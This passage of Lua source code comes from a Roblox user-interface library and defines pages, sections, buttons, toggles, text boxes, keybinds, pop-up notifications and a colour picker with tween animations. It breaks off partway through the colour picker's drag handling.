								SortOrder = Enum.SortOrder.LayoutOrder,
								Padding = UDim.new(0, 10)
							})
						})
					}),
					utility:Create("ImageLabel", {
						Name = "TopBar",
						BackgroundTransparency = 1,
						ClipsDescendants = true,
						Size = UDim2.new(1, 0, 0, 38),
						ZIndex = 5,
						Image = "rbxassetid://4595286933",
						ImageColor3 = themes.Accent,
						ScaleType = Enum.ScaleType.Slice,
						SliceCenter = Rect.new(4, 4, 296, 296)
					}, {
						utility:Create("TextLabel", { -- title
							Name = "Title",
							AnchorPoint = Vector2.new(0, 0.5),
							BackgroundTransparency = 1,
							Position = UDim2.new(0, 12, 0, 19),
							Size = UDim2.new(1, -46, 0, 16),
							ZIndex = 5,
							Font = Enum.Font.GothamBold,
							Text = title,
							TextColor3 = themes.TextColor,
							TextSize = 14,
							TextXAlignment = Enum.TextXAlignment.Left
						})
					})
				})
			})

			utility:InitializeKeybind()
			utility:DraggingEnabled(container.Main.TopBar, container.Main)

			return setmetatable({
				container = container,
				pagesContainer = container.Main.Pages.Pages_Container,
				pages = {}
			}, library)
		end

		function page.new(library, title, icon)
			local button = utility:Create("TextButton", {
				Name = title,
				Parent = library.pagesContainer,
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				Size = UDim2.new(1, 0, 0, 26),
				ZIndex = 3,
				AutoButtonColor = false,
				Font = Enum.Font.Gotham,
				Text = "",
				TextSize = 14
			}, {
				utility:Create("TextLabel", {
					Name = "Title",
					AnchorPoint = Vector2.new(0, 0.5),
					BackgroundTransparency = 1,
					Position = UDim2.new(0, 40, 0.5, 0),
					Size = UDim2.new(0, 76, 1, 0),
					ZIndex = 3,
					Font = Enum.Font.Gotham,
					Text = title,
					TextColor3 = themes.TextColor,
					TextSize = 12,
					TextTransparency = 0.65,
					TextXAlignment = Enum.TextXAlignment.Left
				}),
				icon and utility:Create("ImageLabel", {
					Name = "Icon", 
					AnchorPoint = Vector2.new(0, 0.5),
					BackgroundTransparency = 1,
					Position = UDim2.new(0, 12, 0.5, 0),
					Size = UDim2.new(0, 16, 0, 16),
					ZIndex = 3,
					Image = "rbxassetid://" .. tostring(icon),
					ImageColor3 = themes.TextColor,
					ImageTransparency = 0.64
				}) or {}
			})

			local container = utility:Create("ScrollingFrame", {
				Name = title,
				Parent = library.container.Main,
				Active = true,
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				Position = UDim2.new(0, 134, 0, 46),
				Size = UDim2.new(1, -142, 1, -56),
				CanvasSize = UDim2.new(0, 0, 0, 466),
				ScrollBarThickness = 3,
				ScrollBarImageColor3 = themes.DarkContrast,
				Visible = false
			}, {
				utility:Create("UIListLayout", {
					SortOrder = Enum.SortOrder.LayoutOrder,
					Padding = UDim.new(0, 10)
				})
			})

			return setmetatable({
				library = library,
				container = container,
				button = button,
				sections = {}
			}, page)
		end

		function section.new(page, title)
			local container = utility:Create("ImageLabel", {
				Name = title,
				Parent = page.container,
				BackgroundTransparency = 1,
				Size = UDim2.new(1, -10, 0, 28),
				ZIndex = 2,
				Image = "rbxassetid://5028857472",
				ImageColor3 = themes.LightContrast,
				ScaleType = Enum.ScaleType.Slice,
				SliceCenter = Rect.new(4, 4, 296, 296),
				ClipsDescendants = true
			}, {
				utility:Create("Frame", {
					Name = "Container",
					Active = true,
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					Position = UDim2.new(0, 8, 0, 8),
					Size = UDim2.new(1, -16, 1, -16)
				}, {
					utility:Create("TextLabel", {
						Name = "Title",
						BackgroundTransparency = 1,
						Size = UDim2.new(1, 0, 0, 20),
						ZIndex = 2,
						Font = Enum.Font.GothamSemibold,
						Text = title,
						TextColor3 = themes.TextColor,
						TextSize = 12,
						TextXAlignment = Enum.TextXAlignment.Left,
						TextTransparency = 1
					}),
					utility:Create("UIListLayout", {
						SortOrder = Enum.SortOrder.LayoutOrder,
						Padding = UDim.new(0, 4)
					})
				})
			})

			return setmetatable({
				page = page,
				container = container.Container,
				colorpickers = {},
				modules = {},
				binds = {},
				lists = {},
			}, section) 
		end

		function library:addPage(...)

			local page = page.new(self, ...)
			local button = page.button

			table.insert(self.pages, page)

			button.MouseButton1Click:Connect(function()
				self:SelectPage(page, true)
			end)

			return page
		end

		function page:addSection(...)
			local section = section.new(self, ...)

			table.insert(self.sections, section)

			return section
		end

		-- functions

		function library:setTheme(theme, color3)
			themes[theme] = color3

			for property, objects in pairs(objects[theme]) do
				for i, object in pairs(objects) do
					if not object.Parent or (object.Name == "Button" and object.Parent.Name == "ColorPicker") then
						objects[i] = nil -- i can do this because weak tables :D
					else
						object[property] = color3
					end
				end
			end
		end

		function library:toggle()

			if self.toggling then
				return
			end

			self.toggling = true

			local container = self.container.Main
			local topbar = container.TopBar

			if self.position then
				utility:Tween(container, {
					Size = UDim2.new(0, 511, 0, 428),
					Position = self.position
				}, 0.2)
				wait(0.2)

				utility:Tween(topbar, {Size = UDim2.new(1, 0, 0, 38)}, 0.2)
				wait(0.2)

				container.ClipsDescendants = false
				self.position = nil
			else
				self.position = container.Position
				container.ClipsDescendants = true

				utility:Tween(topbar, {Size = UDim2.new(1, 0, 1, 0)}, 0.2)
				wait(0.2)

				utility:Tween(container, {
					Size = UDim2.new(0, 511, 0, 0),
					Position = self.position + UDim2.new(0, 0, 0, 428)
				}, 0.2)
				wait(0.2)
			end

			self.toggling = false
		end

		-- new modules

		function library:Notify(title, text, callback)

			-- overwrite last notification
			if self.activeNotification then
				self.activeNotification = self.activeNotification()
			end

			-- standard create
			local notification = utility:Create("ImageLabel", {
				Name = "Notification",
				Parent = self.container,
				BackgroundTransparency = 1,
				Size = UDim2.new(0, 200, 0, 60),
				Image = "rbxassetid://5028857472",
				ImageColor3 = themes.Background,
				ScaleType = Enum.ScaleType.Slice,
				SliceCenter = Rect.new(4, 4, 296, 296),
				ZIndex = 3,
				ClipsDescendants = true
			}, {
				utility:Create("ImageLabel", {
					Name = "Flash",
					Size = UDim2.new(1, 0, 1, 0),
					BackgroundTransparency = 1,
					Image = "rbxassetid://4641149554",
					ImageColor3 = themes.TextColor,
					ZIndex = 5
				}),
				utility:Create("ImageLabel", {
					Name = "Glow",
					BackgroundTransparency = 1,
					Position = UDim2.new(0, -15, 0, -15),
					Size = UDim2.new(1, 30, 1, 30),
					ZIndex = 2,
					Image = "rbxassetid://5028857084",
					ImageColor3 = themes.Glow,
					ScaleType = Enum.ScaleType.Slice,
					SliceCenter = Rect.new(24, 24, 276, 276)
				}),
				utility:Create("TextLabel", {
					Name = "Title",
					BackgroundTransparency = 1,
					Position = UDim2.new(0, 10, 0, 8),
					Size = UDim2.new(1, -40, 0, 16),
					ZIndex = 4,
					Font = Enum.Font.GothamSemibold,
					TextColor3 = themes.TextColor,
					TextSize = 14.000,
					TextXAlignment = Enum.TextXAlignment.Left
				}),
				utility:Create("TextLabel", {
					Name = "Text",
					BackgroundTransparency = 1,
					Position = UDim2.new(0, 10, 1, -24),
					Size = UDim2.new(1, -40, 0, 16),
					ZIndex = 4,
					Font = Enum.Font.Gotham,
					TextColor3 = themes.TextColor,
					TextSize = 12.000,
					TextXAlignment = Enum.TextXAlignment.Left
				}),
				utility:Create("ImageButton", {
					Name = "Accept",
					BackgroundTransparency = 1,
					Position = UDim2.new(1, -26, 0, 8),
					Size = UDim2.new(0, 16, 0, 16),
					Image = "rbxassetid://5012538259",
					ImageColor3 = themes.TextColor,
					ZIndex = 4
				}),
				utility:Create("ImageButton", {
					Name = "Decline",
					BackgroundTransparency = 1,
					Position = UDim2.new(1, -26, 1, -24),
					Size = UDim2.new(0, 16, 0, 16),
					Image = "rbxassetid://5012538583",
					ImageColor3 = themes.TextColor,
					ZIndex = 4
				})
			})

			-- dragging
			utility:DraggingEnabled(notification)

			-- position and size
			title = title or "Notification"
			text = text or ""

			notification.Title.Text = title
			notification.Text.Text = text

			local padding = 10
			local textSize = game:GetService("TextService"):GetTextSize(text, 12, Enum.Font.Gotham, Vector2.new(math.huge, 16))

			notification.Position = library.lastNotification or UDim2.new(0, padding, 1, -(notification.AbsoluteSize.Y + padding))
			notification.Size = UDim2.new(0, 0, 0, 60)

			utility:Tween(notification, {Size = UDim2.new(0, textSize.X + 70, 0, 60)}, 0.2)
			wait(0.2)

			notification.ClipsDescendants = false
			utility:Tween(notification.Flash, {
				Size = UDim2.new(0, 0, 0, 60),
				Position = UDim2.new(1, 0, 0, 0)
			}, 0.2)

			-- callbacks
			local active = true
			local close = function()

				if not active then
					return
				end

				active = false
				notification.ClipsDescendants = true

				library.lastNotification = notification.Position
				notification.Flash.Position = UDim2.new(0, 0, 0, 0)
				utility:Tween(notification.Flash, {Size = UDim2.new(1, 0, 1, 0)}, 0.2)

				wait(0.2)
				utility:Tween(notification, {
					Size = UDim2.new(0, 0, 0, 60),
					Position = notification.Position + UDim2.new(0, textSize.X + 70, 0, 0)
				}, 0.2)

				wait(0.2)
				notification:Destroy()
			end

			self.activeNotification = close

			notification.Accept.MouseButton1Click:Connect(function()

				if not active then 
					return
				end

				if callback then
					callback(true)
				end

				close()
			end)

			notification.Decline.MouseButton1Click:Connect(function()

				if not active then 
					return
				end

				if callback then
					callback(false)
				end

				close()
			end)
		end

		function section:addButton(title, callback)
			local button = utility:Create("ImageButton", {
				Name = "Button",
				Parent = self.container,
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				Size = UDim2.new(1, 0, 0, 30),
				ZIndex = 2,
				Image = "rbxassetid://5028857472",
				ImageColor3 = themes.DarkContrast,
				ScaleType = Enum.ScaleType.Slice,
				SliceCenter = Rect.new(2, 2, 298, 298)
			}, {
				utility:Create("TextLabel", {
					Name = "Title",
					BackgroundTransparency = 1,
					Size = UDim2.new(1, 0, 1, 0),
					ZIndex = 3,
					Font = Enum.Font.Gotham,
					Text = title,
					TextColor3 = themes.TextColor,
					TextSize = 12,
					TextTransparency = 0.10000000149012
				})
			})

			table.insert(self.modules, button)
			--self:Resize()

			local text = button.Title
			local debounce

			button.MouseButton1Click:Connect(function()

				if debounce then
					return
				end

				-- animation
				utility:Pop(button, 10)

				debounce = true
				text.TextSize = 0
				utility:Tween(button.Title, {TextSize = 14}, 0.2)

				wait(0.2)
				utility:Tween(button.Title, {TextSize = 12}, 0.2)

				if callback then
					callback(function(...)
						self:updateButton(button, ...)
					end)
				end

				debounce = false
			end)

			return button
		end

		function section:addToggle(title, default, callback)
			local toggle = utility:Create("ImageButton", {
				Name = "Toggle",
				Parent = self.container,
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				Size = UDim2.new(1, 0, 0, 30),
				ZIndex = 2,
				Image = "rbxassetid://5028857472",
				ImageColor3 = themes.DarkContrast,
				ScaleType = Enum.ScaleType.Slice,
				SliceCenter = Rect.new(2, 2, 298, 298)
			},{
				utility:Create("TextLabel", {
					Name = "Title",
					AnchorPoint = Vector2.new(0, 0.5),
					BackgroundTransparency = 1,
					Position = UDim2.new(0, 10, 0.5, 1),
					Size = UDim2.new(0.5, 0, 1, 0),
					ZIndex = 3,
					Font = Enum.Font.Gotham,
					Text = title,
					TextColor3 = themes.TextColor,
					TextSize = 12,
					TextTransparency = 0.10000000149012,
					TextXAlignment = Enum.TextXAlignment.Left
				}),
				utility:Create("ImageLabel", {
					Name = "Button",
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					Position = UDim2.new(1, -50, 0.5, -8),
					Size = UDim2.new(0, 40, 0, 16),
					ZIndex = 2,
					Image = "rbxassetid://5028857472",
					ImageColor3 = themes.LightContrast,
					ScaleType = Enum.ScaleType.Slice,
					SliceCenter = Rect.new(2, 2, 298, 298)
				}, {
					utility:Create("ImageLabel", {
						Name = "Frame",
						BackgroundTransparency = 1,
						Position = UDim2.new(0, 2, 0.5, -6),
						Size = UDim2.new(1, -22, 1, -4),
						ZIndex = 2,
						Image = "rbxassetid://5028857472",
						ImageColor3 = themes.TextColor,
						ScaleType = Enum.ScaleType.Slice,
						SliceCenter = Rect.new(2, 2, 298, 298)
					})
				})
			})

			table.insert(self.modules, toggle)
			--self:Resize()

			local active = default
			self:updateToggle(toggle, nil, active)

			toggle.MouseButton1Click:Connect(function()
				active = not active
				self:updateToggle(toggle, nil, active)

				if callback then
					callback(active, function(...)
						self:updateToggle(toggle, ...)
					end)
				end
			end)

			return toggle
		end

		function section:addTextbox(title, default, callback)
			local textbox = utility:Create("ImageButton", {
				Name = "Textbox",
				Parent = self.container,
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				Size = UDim2.new(1, 0, 0, 30),
				ZIndex = 2,
				Image = "rbxassetid://5028857472",
				ImageColor3 = themes.DarkContrast,
				ScaleType = Enum.ScaleType.Slice,
				SliceCenter = Rect.new(2, 2, 298, 298)
			}, {
				utility:Create("TextLabel", {
					Name = "Title",
					AnchorPoint = Vector2.new(0, 0.5),
					BackgroundTransparency = 1,
					Position = UDim2.new(0, 10, 0.5, 1),
					Size = UDim2.new(0.5, 0, 1, 0),
					ZIndex = 3,
					Font = Enum.Font.Gotham,
					Text = title,
					TextColor3 = themes.TextColor,
					TextSize = 12,
					TextTransparency = 0.10000000149012,
					TextXAlignment = Enum.TextXAlignment.Left
				}),
				utility:Create("ImageLabel", {
					Name = "Button",
					BackgroundTransparency = 1,
					Position = UDim2.new(1, -110, 0.5, -8),
					Size = UDim2.new(0, 100, 0, 16),
					ZIndex = 2,
					Image = "rbxassetid://5028857472",
					ImageColor3 = themes.LightContrast,
					ScaleType = Enum.ScaleType.Slice,
					SliceCenter = Rect.new(2, 2, 298, 298)
				}, {
					utility:Create("TextBox", {
						Name = "Textbox", 
						BackgroundTransparency = 1,
						TextTruncate = Enum.TextTruncate.AtEnd,
						Position = UDim2.new(0, 5, 0, 0),
						Size = UDim2.new(1, -10, 1, 0),
						ZIndex = 3,
						Font = Enum.Font.GothamSemibold,
						Text = default or "",
						TextColor3 = themes.TextColor,
						TextSize = 11
					})
				})
			})

			table.insert(self.modules, textbox)
			--self:Resize()

			local button = textbox.Button
			local input = button.Textbox

			textbox.MouseButton1Click:Connect(function()

				if textbox.Button.Size ~= UDim2.new(0, 100, 0, 16) then
					return
				end

				utility:Tween(textbox.Button, {
					Size = UDim2.new(0, 200, 0, 16),
					Position = UDim2.new(1, -210, 0.5, -8)
				}, 0.2)

				wait()

				input.TextXAlignment = Enum.TextXAlignment.Left
				input:CaptureFocus()
			end)

			input:GetPropertyChangedSignal("Text"):Connect(function()

				if button.ImageTransparency == 0 and (button.Size == UDim2.new(0, 200, 0, 16) or button.Size == UDim2.new(0, 100, 0, 16)) then -- i know, i dont like this either
					utility:Pop(button, 10)
				end

				if callback then
					callback(input.Text, nil, function(...)
						self:updateTextbox(textbox, ...)
					end)
				end
			end)

			input.FocusLost:Connect(function()

				input.TextXAlignment = Enum.TextXAlignment.Center

				utility:Tween(textbox.Button, {
					Size = UDim2.new(0, 100, 0, 16),
					Position = UDim2.new(1, -110, 0.5, -8)
				}, 0.2)

				if callback then
					callback(input.Text, true, function(...)
						self:updateTextbox(textbox, ...)
					end)
				end
			end)

			return textbox
		end

		function section:addKeybind(title, default, callback, changedCallback)
			local keybind = utility:Create("ImageButton", {
				Name = "Keybind",
				Parent = self.container,
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				Size = UDim2.new(1, 0, 0, 30),
				ZIndex = 2,
				Image = "rbxassetid://5028857472",
				ImageColor3 = themes.DarkContrast,
				ScaleType = Enum.ScaleType.Slice,
				SliceCenter = Rect.new(2, 2, 298, 298)
			}, {
				utility:Create("TextLabel", {
					Name = "Title",
					AnchorPoint = Vector2.new(0, 0.5),
					BackgroundTransparency = 1,
					Position = UDim2.new(0, 10, 0.5, 1),
					Size = UDim2.new(1, 0, 1, 0),
					ZIndex = 3,
					Font = Enum.Font.Gotham,
					Text = title,
					TextColor3 = themes.TextColor,
					TextSize = 12,
					TextTransparency = 0.10000000149012,
					TextXAlignment = Enum.TextXAlignment.Left
				}),
				utility:Create("ImageLabel", {
					Name = "Button",
					BackgroundTransparency = 1,
					Position = UDim2.new(1, -110, 0.5, -8),
					Size = UDim2.new(0, 100, 0, 16),
					ZIndex = 2,
					Image = "rbxassetid://5028857472",
					ImageColor3 = themes.LightContrast,
					ScaleType = Enum.ScaleType.Slice,
					SliceCenter = Rect.new(2, 2, 298, 298)
				}, {
					utility:Create("TextLabel", {
						Name = "Text",
						BackgroundTransparency = 1,
						ClipsDescendants = true,
						Size = UDim2.new(1, 0, 1, 0),
						ZIndex = 3,
						Font = Enum.Font.GothamSemibold,
						Text = default and default.Name or "None",
						TextColor3 = themes.TextColor,
						TextSize = 11
					})
				})
			})

			table.insert(self.modules, keybind)
			--self:Resize()

			local text = keybind.Button.Text
			local button = keybind.Button

			local animate = function()
				if button.ImageTransparency == 0 then
					utility:Pop(button, 10)
				end
			end

			self.binds[keybind] = {callback = function()
				animate()

				if callback then
					callback(function(...)
						self:updateKeybind(keybind, ...)
					end)
				end
			end}

			if default and callback then
				self:updateKeybind(keybind, nil, default)
			end

			keybind.MouseButton1Click:Connect(function()

				animate()

				if self.binds[keybind].connection then -- unbind
					return self:updateKeybind(keybind)
				end

				if text.Text == "None" then -- new bind
					text.Text = "..."

					local key = utility:KeyPressed()

					self:updateKeybind(keybind, nil, key.KeyCode)
					animate()

					if changedCallback then
						changedCallback(key, function(...)
							self:updateKeybind(keybind, ...)
						end)
					end
				end
			end)

			return keybind
		end

		function section:addColorPicker(title, default, callback)
			local colorpicker = utility:Create("ImageButton", {
				Name = "ColorPicker",
				Parent = self.container,
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				Size = UDim2.new(1, 0, 0, 30),
				ZIndex = 2,
				Image = "rbxassetid://5028857472",
				ImageColor3 = themes.DarkContrast,
				ScaleType = Enum.ScaleType.Slice,
				SliceCenter = Rect.new(2, 2, 298, 298)
			},{
				utility:Create("TextLabel", {
					Name = "Title",
					AnchorPoint = Vector2.new(0, 0.5),
					BackgroundTransparency = 1,
					Position = UDim2.new(0, 10, 0.5, 1),
					Size = UDim2.new(0.5, 0, 1, 0),
					ZIndex = 3,
					Font = Enum.Font.Gotham,
					Text = title,
					TextColor3 = themes.TextColor,
					TextSize = 12,
					TextTransparency = 0.10000000149012,
					TextXAlignment = Enum.TextXAlignment.Left
				}),
				utility:Create("ImageButton", {
					Name = "Button",
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					Position = UDim2.new(1, -50, 0.5, -7),
					Size = UDim2.new(0, 40, 0, 14),
					ZIndex = 2,
					Image = "rbxassetid://5028857472",
					ImageColor3 = Color3.fromRGB(255, 255, 255),
					ScaleType = Enum.ScaleType.Slice,
					SliceCenter = Rect.new(2, 2, 298, 298)
				})
			})

			local tab = utility:Create("ImageLabel", {
				Name = "ColorPicker",
				Parent = self.page.library.container,
				BackgroundTransparency = 1,
				Position = UDim2.new(0.75, 0, 0.400000006, 0),
				Selectable = true,
				AnchorPoint = Vector2.new(0.5, 0.5),
				Size = UDim2.new(0, 162, 0, 169),
				Image = "rbxassetid://5028857472",
				ImageColor3 = themes.Background,
				ScaleType = Enum.ScaleType.Slice,
				SliceCenter = Rect.new(2, 2, 298, 298),
				Visible = false,
			}, {
				utility:Create("ImageLabel", {
					Name = "Glow",
					BackgroundTransparency = 1,
					Position = UDim2.new(0, -15, 0, -15),
					Size = UDim2.new(1, 30, 1, 30),
					ZIndex = 0,
					Image = "rbxassetid://5028857084",
					ImageColor3 = themes.Glow,
					ScaleType = Enum.ScaleType.Slice,
					SliceCenter = Rect.new(22, 22, 278, 278)
				}),
				utility:Create("TextLabel", {
					Name = "Title",
					BackgroundTransparency = 1,
					Position = UDim2.new(0, 10, 0, 8),
					Size = UDim2.new(1, -40, 0, 16),
					ZIndex = 2,
					Font = Enum.Font.GothamSemibold,
					Text = title,
					TextColor3 = themes.TextColor,
					TextSize = 14,
					TextXAlignment = Enum.TextXAlignment.Left
				}),
				utility:Create("ImageButton", {
					Name = "Close",
					BackgroundTransparency = 1,
					Position = UDim2.new(1, -26, 0, 8),
					Size = UDim2.new(0, 16, 0, 16),
					ZIndex = 2,
					Image = "rbxassetid://5012538583",
					ImageColor3 = themes.TextColor
				}), 
				utility:Create("Frame", {
					Name = "Container",
					BackgroundTransparency = 1,
					Position = UDim2.new(0, 8, 0, 32),
					Size = UDim2.new(1, -18, 1, -40)
				}, {
					utility:Create("UIListLayout", {
						SortOrder = Enum.SortOrder.LayoutOrder,
						Padding = UDim.new(0, 6)
					}),
					utility:Create("ImageButton", {
						Name = "Canvas",
						BackgroundTransparency = 1,
						BorderColor3 = themes.LightContrast,
						Size = UDim2.new(1, 0, 0, 60),
						AutoButtonColor = false,
						Image = "rbxassetid://5108535320",
						ImageColor3 = Color3.fromRGB(255, 0, 0),
						ScaleType = Enum.ScaleType.Slice,
						SliceCenter = Rect.new(2, 2, 298, 298)
					}, {
						utility:Create("ImageLabel", {
							Name = "White_Overlay",
							BackgroundTransparency = 1,
							Size = UDim2.new(1, 0, 0, 60),
							Image = "rbxassetid://5107152351",
							SliceCenter = Rect.new(2, 2, 298, 298)
						}),
						utility:Create("ImageLabel", {
							Name = "Black_Overlay",
							BackgroundTransparency = 1,
							Size = UDim2.new(1, 0, 0, 60),
							Image = "rbxassetid://5107152095",
							SliceCenter = Rect.new(2, 2, 298, 298)
						}),
						utility:Create("ImageLabel", {
							Name = "Cursor",
							BackgroundColor3 = themes.TextColor,
							AnchorPoint = Vector2.new(0.5, 0.5),
							BackgroundTransparency = 1.000,
							Size = UDim2.new(0, 10, 0, 10),
							Position = UDim2.new(0, 0, 0, 0),
							Image = "rbxassetid://5100115962",
							SliceCenter = Rect.new(2, 2, 298, 298)
						})
					}),
					utility:Create("ImageButton", {
						Name = "Color",
						BackgroundTransparency = 1,
						BorderSizePixel = 0,
						Position = UDim2.new(0, 0, 0, 4),
						Selectable = false,
						Size = UDim2.new(1, 0, 0, 16),
						ZIndex = 2,
						AutoButtonColor = false,
						Image = "rbxassetid://5028857472",
						ScaleType = Enum.ScaleType.Slice,
						SliceCenter = Rect.new(2, 2, 298, 298)
					}, {
						utility:Create("Frame", {
							Name = "Select",
							BackgroundColor3 = themes.TextColor,
							BorderSizePixel = 1,
							Position = UDim2.new(1, 0, 0, 0),
							Size = UDim2.new(0, 2, 1, 0),
							ZIndex = 2
						}),
						utility:Create("UIGradient", { -- rainbow canvas
							Color = ColorSequence.new({
								ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)), 
								ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 255, 0)), 
								ColorSequenceKeypoint.new(0.33, Color3.fromRGB(0, 255, 0)), 
								ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 255, 255)), 
								ColorSequenceKeypoint.new(0.66, Color3.fromRGB(0, 0, 255)), 
								ColorSequenceKeypoint.new(0.82, Color3.fromRGB(255, 0, 255)), 
								ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 0))
							})
						})
					}),
					utility:Create("Frame", {
						Name = "Inputs",
						BackgroundTransparency = 1,
						Position = UDim2.new(0, 10, 0, 158),
						Size = UDim2.new(1, 0, 0, 16)
					}, {
						utility:Create("UIListLayout", {
							FillDirection = Enum.FillDirection.Horizontal,
							SortOrder = Enum.SortOrder.LayoutOrder,
							Padding = UDim.new(0, 6)
						}),
						utility:Create("ImageLabel", {
							Name = "R",
							BackgroundTransparency = 1,
							BorderSizePixel = 0,
							Size = UDim2.new(0.305, 0, 1, 0),
							ZIndex = 2,
							Image = "rbxassetid://5028857472",
							ImageColor3 = themes.DarkContrast,
							ScaleType = Enum.ScaleType.Slice,
							SliceCenter = Rect.new(2, 2, 298, 298)
						}, {
							utility:Create("TextLabel", {
								Name = "Text",
								BackgroundTransparency = 1,
								Size = UDim2.new(0.400000006, 0, 1, 0),
								ZIndex = 2,
								Font = Enum.Font.Gotham,
								Text = "R:",
								TextColor3 = themes.TextColor,
								TextSize = 10.000
							}),
							utility:Create("TextBox", {
								Name = "Textbox",
								BackgroundTransparency = 1,
								Position = UDim2.new(0.300000012, 0, 0, 0),
								Size = UDim2.new(0.600000024, 0, 1, 0),
								ZIndex = 2,
								Font = Enum.Font.Gotham,
								PlaceholderColor3 = themes.DarkContrast,
								Text = "255",
								TextColor3 = themes.TextColor,
								TextSize = 10.000
							})
						}),
						utility:Create("ImageLabel", {
							Name = "G",
							BackgroundTransparency = 1,
							BorderSizePixel = 0,
							Size = UDim2.new(0.305, 0, 1, 0),
							ZIndex = 2,
							Image = "rbxassetid://5028857472",
							ImageColor3 = themes.DarkContrast,
							ScaleType = Enum.ScaleType.Slice,
							SliceCenter = Rect.new(2, 2, 298, 298)
						}, {
							utility:Create("TextLabel", {
								Name = "Text",
								BackgroundTransparency = 1,
								ZIndex = 2,
								Size = UDim2.new(0.400000006, 0, 1, 0),
								Font = Enum.Font.Gotham,
								Text = "G:",
								TextColor3 = themes.TextColor,
								TextSize = 10.000
							}),
							utility:Create("TextBox", {
								Name = "Textbox",
								BackgroundTransparency = 1,
								Position = UDim2.new(0.300000012, 0, 0, 0),
								Size = UDim2.new(0.600000024, 0, 1, 0),
								ZIndex = 2,
								Font = Enum.Font.Gotham,
								Text = "255",
								TextColor3 = themes.TextColor,
								TextSize = 10.000
							})
						}),
						utility:Create("ImageLabel", {
							Name = "B",
							BackgroundTransparency = 1,
							BorderSizePixel = 0,
							Size = UDim2.new(0.305, 0, 1, 0),
							ZIndex = 2,
							Image = "rbxassetid://5028857472",
							ImageColor3 = themes.DarkContrast,
							ScaleType = Enum.ScaleType.Slice,
							SliceCenter = Rect.new(2, 2, 298, 298)
						}, {
							utility:Create("TextLabel", {
								Name = "Text",
								BackgroundTransparency = 1,
								Size = UDim2.new(0.400000006, 0, 1, 0),
								ZIndex = 2,
								Font = Enum.Font.Gotham,
								Text = "B:",
								TextColor3 = themes.TextColor,
								TextSize = 10.000
							}),
							utility:Create("TextBox", {
								Name = "Textbox",
								BackgroundTransparency = 1,
								Position = UDim2.new(0.300000012, 0, 0, 0),
								Size = UDim2.new(0.600000024, 0, 1, 0),
								ZIndex = 2,
								Font = Enum.Font.Gotham,
								Text = "255",
								TextColor3 = themes.TextColor,
								TextSize = 10.000
							})
						}),
					}),
					utility:Create("ImageButton", {
						Name = "Button",
						BackgroundTransparency = 1,
						BorderSizePixel = 0,
						Size = UDim2.new(1, 0, 0, 20),
						ZIndex = 2,
						Image = "rbxassetid://5028857472",
						ImageColor3 = themes.DarkContrast,
						ScaleType = Enum.ScaleType.Slice,
						SliceCenter = Rect.new(2, 2, 298, 298)
					}, {
						utility:Create("TextLabel", {
							Name = "Text",
							BackgroundTransparency = 1,
							Size = UDim2.new(1, 0, 1, 0),
							ZIndex = 3,
							Font = Enum.Font.Gotham,
							Text = "Submit",
							TextColor3 = themes.TextColor,
							TextSize = 11.000
						})
					})
				})
			})

			utility:DraggingEnabled(tab)
			table.insert(self.modules, colorpicker)
			--self:Resize()

			local allowed = {
				[""] = true
			}

			local canvas = tab.Container.Canvas
			local color = tab.Container.Color

			local canvasSize, canvasPosition = canvas.AbsoluteSize, canvas.AbsolutePosition
			local colorSize, colorPosition = color.AbsoluteSize, color.AbsolutePosition

			local draggingColor, draggingCanvas

			local color3 = default or Color3.fromRGB(255, 255, 255)
			local hue, sat, brightness = 0, 0, 1
			local rgb = {
				r = 255,
				g = 255,
				b = 255
			}

			self.colorpickers[colorpicker] = {
				tab = tab,
				callback = function(prop, value)
					rgb[prop] = value
					hue, sat, brightness = Color3.toHSV(Color3.fromRGB(rgb.r, rgb.g, rgb.b))
				end
			}

			local callback = function(value)
				if callback then
					callback(value, function(...)
						self:updateColorPicker(colorpicker, ...)
					end)
				end
			end

			utility:DraggingEnded(function()
				draggingColor, draggingCanvas = false, false
			end)

			if default then
				self:updateColorPicker(colorpicker, nil, default)

				hue, sat, brightness = Color3.toHSV(default)
				default = Color3.fromHSV(hue, sat, brightness)

				for i, prop in pairs({"r", "g", "b"}) do
					rgb[prop] = default[prop:upper()] * 255
				end
			end

			for i, container in pairs(tab.Container.Inputs:GetChildren()) do -- i know what you are about to say, so shut up
				if container:IsA("ImageLabel") then
					local textbox = container.Textbox
					local focused

					textbox.Focused:Connect(function()
						focused = true
					end)

					textbox.FocusLost:Connect(function()
						focused = false

						if not tonumber(textbox.Text) then
							textbox.Text = math.floor(rgb[container.Name:lower()])
						end
					end)

					textbox:GetPropertyChangedSignal("Text"):Connect(function()
						local text = textbox.Text

						if not allowed[text] and not tonumber(text) then
							textbox.Text = text:sub(1, #text - 1)
						elseif focused and not allowed[text] then
							rgb[container.Name:lower()] = math.clamp(tonumber(textbox.Text), 0, 255)

							local color3 = Color3.fromRGB(rgb.r, rgb.g, rgb.b)
							hue, sat, brightness = Color3.toHSV(color3)

							self:updateColorPicker(colorpicker, nil, color3)
							callback(color3)
						end
					end)
				end
			end

			canvas.MouseButton1Down:Connect(function()
				draggingCanvas = true

				while draggingCanvas do

					local x, y = mouse.X, mouse.Y

					sat = math.clamp((x - canvasPosition.X) / canvasSize.X, 0, 1)
					brightness = 1 - math.clamp((y - canvasPosition.Y) / canvasSize.Y, 0, 1)

					color3 = Color3.fromHSV(hue, sat, brightness)

					for i, prop in pairs({"r", "g", "b"}) do
						rgb[prop] = color3[prop:upper()] * 255
					end

					self:updateColorPicker(colorpicker, nil, {hue, sat, brightness}) -- roblox is literally retarded
					utility:Tween(canvas.Cursor, {Position = UDim2.new(sat, 0, 1 - brightness, 0)}, 0.1) -- overwrite

					callback(color3)
					utility:Wait()
				end
			end)

			color.MouseButton1Down:Connect(function()
				draggingColor = true

				while draggingColor do

					hue = 1 - math.clamp(1 - ((mouse.X - colorPosition.X) / colorSize.X), 0, 1)
					color3 = Color3.fromHSV(hue, sat, brightness)

